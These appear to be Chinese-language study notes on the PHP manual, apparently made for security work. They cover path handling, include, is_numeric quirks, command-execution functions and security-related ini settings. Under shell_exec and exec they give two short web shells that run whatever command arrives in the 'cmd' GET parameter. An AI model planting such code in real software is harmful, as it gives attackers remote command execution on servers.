## 配置

https://www.php.net/manual/en/ini.core.php

- `cgi.fix_pathinfo` `bool`

    为 CGI 提供真正的 `PATH_INFO`/`PATH_TRANSLATED` 支持。PHP 之前的行为是将 `PATH_TRANSLATED` 设置为 `SCRIPT_FILENAME`，并且不解析 `PATH_INFO` 是什么。关于 `PATH_INFO` 的更多信息，请参阅 CGI 规范。将此选项设置为 1 将使 PHP CGI 修复其路径以符合规范。设置为 0 将使 PHP 恢复之前的行为。此选项默认开启。您应修改您的脚本以使用 `SCRIPT_FILENAME` 而非 `PATH_TRANSLATED`。

    > 即，此处默认设置：当路径文件不存在时的向前回溯的文件查找行为

## 语法

### 文件系统

#### move_uploaded_file()

```php
function move_uploaded_file(string $from, string $to): bool
```

当 from 文件有效时，上传到 to 路径


#### unlink() - 删除文件

```php
function unlink(string $filename, ?resource $context = null): bool
```

删除 filename 文件，如果文件是符号链接，将会删除符号链接。

#### symlink() - 创建符号链接

```php
function symlink(string $target, string $link): bool
```

symlink() creates a symbolic link to the existing target with the specified name link. 

#### readlink() - 读取符号链接指向的路径

```php
function readlink(string $path): string|false
```

Returns the contents of the symbolic link path or false on error. 

# PHP 手册

https://www.php.net/manual/zh/index.php

## 语言参考 

### 概述

#### 名称解析规则

https://www.php.net/manual/zh/language.namespaces.rules.php

命名空间名称定义

- 非限定名称（Unqualified name）：名称中不包含命名空间分隔符的标识符，例如 `Foo`
- 限定名称（Qualified name）：名称中含有命名空间分隔符的标识符，例如 `Foo\Bar`
- 完全限定名称（Fully qualified name）：名称中包含命名空间分隔符，并以命名空间分隔符开始的标识符，例如 `\Foo\Bar`。`namespace\Foo` 也是一个完全限定名称。
- 相对名称（Relative name）：这是个以 `namespace` 开头的标识符，例如 `namespace\Foo\Bar`。

### 类型

https://www.php.net/manual/zh/language.types.string.php

#### String 字符串 

一个字符串 `string` 就是由一系列的字符组成，其中每个字符等同于一个字节。这意味着 PHP 只能支持 256 的字符集，因此不支持 Unicode 。

单引号
- 单引号内除转义符 `\` 外，特殊字符失去含义，成为普通字符

双引号
- 拥有特殊字符解析
- 变量会被解析，详见变量插值。 

##### 字符串插值

当字符串用双引号或 heredoc 结构定义时，其中的变量可以进行替换。 

基本语法
- 如果遇到一个美元符号（`$`），后面的字符会被解释为变量名，然后替换为变量的值。 
    ```php
    echo "He drank some $juice juice." . PHP_EOL;
    ```
- 如果无法形成有效的变量名，美元符号会保持原样。
- 使用数组时，数组键必须是无引号的，因此不能用基本语法将常量作为键来引用。

高级（大括号）语法
- 高级语法允许使用任意访问器对*变量*进行插值。 
- 使用普通的表达式写法，然后用大括号 `{` 和 `}` 包围。这种语法只有 `{$` 紧随结构才会被识别
    ```php
    // 大括号无效，输出 This is { fantastic}
    echo "This is { $great}";

    // 大括号有效，输出 This is fantastic
    echo "This is {$great}";
    ```

#### include 表达式包含并运行指定文件

```php
// 本地
include 'vars.php';

// URL
include 'http://www.example.com/file.php?foo=1&bar=2';
```

被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 `include_path` 指定的目录寻找。如果在 `include_path` 下没找到该文件则 `include` 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 `include` 结构会发出一条 `E_WARNING` ；这一点和 `require` 不同，后者会发出一个 `E_ERROR` 。

### 预定义变量

#### $_POST — 来自 HTTP POST 请求的表单数据

当 HTTP POST 请求的 Content-Type 是 `application/x-www-form-urlencoded` 或 `multipart/form-data` 时，会将变量以关联数组形式传入当前脚本。 

## 函数参考 

### 变量与类型相关扩展 

#### 变量处理 

##### 变量处理函数

###### is_numeric —— 检测变量是否是数字或数字字符串 

https://www.php.net/manual/zh/function.is-numeric.php

```php
function is_numeric(mixed $value): bool
```

检测变量是否是数字或数字字符串。 

更新日志
- 8.0.0
    - 以空格结尾的数字字符串（`"42 "`）现在将返回 `true`。以前，会返回 `false`。 

```log
'42' is numeric
'02471' is numeric
'1337e0' is numeric

'0x539' is NOT numeric
'0b10100111001' is NOT numeric
```

###### isset —— 检测变量是否已声明并且其值不为 null

```php
function isset(mixed $var, mixed ...$vars): bool
```

###### intval —— 获取变量的整数值

```php
function intval(mixed $value, int $base = 10): int
```

通过使用指定的进制 `base` 转换（默认是十进制），返回变量 `value` 的 `int` 数值。 

###### gettype —— 获取变量的类型

```php
function gettype(mixed $value): string
```

返回 PHP `value` 变量的类型。 对于类型检查，请使用 `is_*` 函数。 

### 数据库扩展 

#### 数据库抽象层 

##### PDO 

###### PDO::__construct ——  创建一个表示数据库连接的 PDO 实例 

https://www.php.net/manual/zh/pdo.construct.php

```php
public function PDO::__construct(
    string $dsn,
    ?string $username = null,
    #[\SensitiveParameter] ?string $password = null,
    ?array $options = null
)
```


### 进程控制扩展 
#### 程序执行 
##### 程序执行函数
###### system — 执行外部程序，并且显示输出

```php
function system(string $command, int &$result_code = null): string|false
```

同 C 版本的 `system()` 函数一样，本函数执行 `command` 参数所指定的命令，并且输出执行结果。 

返回值
- 成功则返回命令输出的最后一行，失败则返回 `false` 

注
- `system` 直接输出执行结果，并仅返回最后一行。无法使用 HTML 标签对返回值进行格式化

###### shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回

```php
function shell_exec(string $command): string|false|null
```

本函数同执行运算符。 

返回值
- 以 `string` 返回已执行命令的输出，如果无法建立管道，则为 `false`，如果发生错误或者命令不产生输出则为 `null`

示例 web shell
```php
<?php
$cmd = $_GET['cmd'];
echo '<hr><pre>$ ' . $cmd . "\n" . shell_exec($cmd) . '</pre><hr>';
?>
```


###### exec — 执行一个外部程序

```php
function exec(string $command, array &$output = null, int &$result_code = null): string|false
```

`exec()` 执行 `command` 参数所指定的命令。 

参数
- `output`
    如果提供了 `output` 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。数组中的数据不包含行尾的空白字符，例如 \n 字符。

- `result_code`
    如果同时提供 `output` 和 `result_code` 参数，命令执行后的返回状态会被写入到此变量。

返回值
- 命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 `passthru()` 函数。
- 失败时返回 `false`。
- 如果想要获取命令的输出内容， 请确保使用 `output` 参数。 

示例
```php
// 使用列表合并函数对 exec 执行后的输出列表进行符号合并
<?php
$output = [];
exec($_GET['cmd'], $output);
echo '<hr><pre>' . implode("\n", $output) . '</pre><hr>';
?>
```

### 文件系统相关扩展 

#### 目录 
##### 目录函数

###### getcwd — 取得当前工作目录

```php
function getcwd(): string|false
```

返回值
- 成功则返回当前工作目录，失败返回 false。 

#### 文件系统 
##### 文件系统函数

###### file_get_contents — 将整个文件读入一个字符串

```php
function file_get_contents(
    string $filename,
    bool $use_include_path = false,
    ?resource $context = null,
    int $offset = 0,
    ?int $length = null
): string|false
```

参数
- `filename`
    要读取的文件的名称。（唯一必选参数）

### 文本处理 

#### PCRE 
##### PCRE 函数 —— preg_replace —— 执行一个正则表达式的搜索和替换

https://www.php.net/manual/zh/function.preg-replace.php


```php
function preg_replace(
    string|array $pattern,
    string|array $replacement,
    string|array $subject,
    int $limit = -1,
    int &$count = null
): string|array|null
```

搜索 `subject` 中匹配 `pattern` 的部分，以 `replacement` 进行替换。 

参数
- `limit`
    每个模式在每个 `subject` 上进行替换的最大次数。默认是 -1(无限)。


#### 字符串 
##### 字符串 函数

###### str_pad —— 使用另一个字符串填充字符串为指定长度

```php
function str_pad(
    string $string,
    int $length,
    string $pad_string = " ",
    int $pad_type = STR_PAD_RIGHT
): string
```

该函数返回 `string` 被从左端、右端或者同时两端被填充到制定长度后的结果。如果可选的 `pad_string` 参数没有被指定，`string` 将被空格字符填充，否则它将被 `pad_string` 填充到指定长度。 

参数
- `length`
    填充字符串到最后的长度。 如果 `length` 的值是负数，小于或者等于输入字符串的长度，不会发生任何填充，并会返回 `string。`


###### substr —— 返回字符串的子串

```php
function substr(string $string, int $offset, ?int $length = null): string
```

返回字符串 `string` 由 `offset` 和 `length` 参数指定的子字符串。 

参数
- `length`

    - 如果提供了正数的 `length`，返回的字符串将从 `offset` 处开始，最多包含 `length` 个字符（取决于 `string` 的长度）。

    - 如果提供了负数的 `length`，那么 `string` 末尾处的 `length` 个字符将会被省略。如果 `offset` 不在这段文本中，将返回空字符串。

    - 如果提供了值为 `0` 的 `length`，将返回一个空字符串。

    - 如果忽略 `length` 或将其设为 `null`，返回的子字符串将从 `offset` 位置开始直到字符串结尾。



###### str_replace — 子字符串替换

```php
function str_replace(
    array|string $search,
    array|string $replace,
    string|array $subject,
    int &$count = null
): string|array
```

该函数返回字符串或者数组。该字符串或数组是将 `subject` 中全部的 `search` 都被 `replace` 替换之后的结果。 

###### echo — 输出一个或多个字符串

```php
function echo(string ...$expressions): void
```

输出一个或多个表达式，没有额外的换行符或者空格。

echo 不是函数，而是语言结构。它的参数是表达式列表，跟在 echo 关键字后面，用逗号分隔，不用括号分隔。与其它的返回结构不同，echo 没有返回值

快捷语法，可以在开始标记后直接跟等号

```php
<?=$foo?>
```

示例
```php
<?php
echo "echo does not require parentheses.";

// 参数是可以产生字符串的任意表达式
$foo = "example";
echo "foo is $foo"; // "foo is example"
?>
```

###### implode — 用字符串连接数组元素

```php
function implode(string $separator, array $array): string

function implode(array $array): string
```

参数

- `separator`
    可选。默认为空字符串。

- `array`
    要使用字符串连接的数组。

返回值
-  返回一个包含所有数组元素并且顺序相同的字符串， 每个元素之间有 `separator` 分隔。 

### 影响 PHP 行为的扩展 
#### 错误处理 
##### 安装/配置

- `display_errors string`
    该选项设置是否将错误信息作为输出的一部分打印到屏幕，或者对用户隐藏。 
    - > 这是辅助开发的功能，不应在生产系统中使用 (例如连接到互联网的系统)。 

#### PHP 选项/信息 
##### PHP 选项/信息 函数

- `set_include_path` — 设置 `include_path` 配置选项

### 文件系统相关扩展 
#### 文件系统 
##### 安装/配置

- `allow_url_fopen bool`
    启用可感知 URL 的 `fopen` 封装协议，从而可以像访问文件一样访问 URL 对象。默认封装协议支持通过 `ftp` 或 `http` 协议访问 远程文件，某些扩展（例如 `zlib`）可能会注册其他封装协议。 

- `allow_url_include bool`
    此选项允许以下函数使用可感知 URL 的 `fopen` 封装协议： `include`、`include_once`、 `require`、`require_once`。 
    - > 此设置要求启用 `allow_url_fopen`。 

##### 文件系统函数

###### file_put_contents — 将数据写入文件

```php
function file_put_contents(
    string $filename,
    mixed $data,
    int $flags = 0,
    ?resource $context = null
): int|false
```

和依次调用 `fopen()`，`fwrite()` 以及 `fclose()` 功能一样。

如果 `filename` 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 `FILE_APPEND` flag。 

## 附录 

https://www.php.net/manual/zh/appendices.php

### php.ini 配置

https://www.php.net/manual/zh/ini.core.php

语言选项
- `disable_functions string`
    -  此指令允许禁用某些函数。它接受逗号分隔的函数名列表作为参数。 从 PHP 8.0.0 开始，禁用函数会删除其定义，允许用户重新定义它。 在 PHP 8.0.0 之前，禁用函数只是阻止函数被调用。
    - 此指令仅能禁用 内置函数。不能影响用户自定义函数。 

- `expose_php bool`
    - 确定是否向外界公开服务器上安装了 PHP，在 HTTP 标头中包含 PHP 版本号（例如：`X-Powered-By: PHP/5.3.7`）。

路径和目录
- `include_path string`

    - 指定 `require`、`include`、`fopen()`、`file()`、`readfile()` 和 `file_get_contents()` 函数在其中查找文件的目录列表，格式类似于系统的 PATH `环境变量:目录列表`，在 Unix 中使用冒号分隔，在 Windows 中使用分号分隔。 
    - 示例 
        ```ini
        # Unix include_path
        include_path=".:/php/includes"

        # Windows include_path
        include_path=".;c:\php\includes"
        ```

- `open_basedir string`
    - 将 PHP 可以访问的文件限制在指定的目录树中，包括文件本身。 
    - 默认设置是允许打开所有文件。 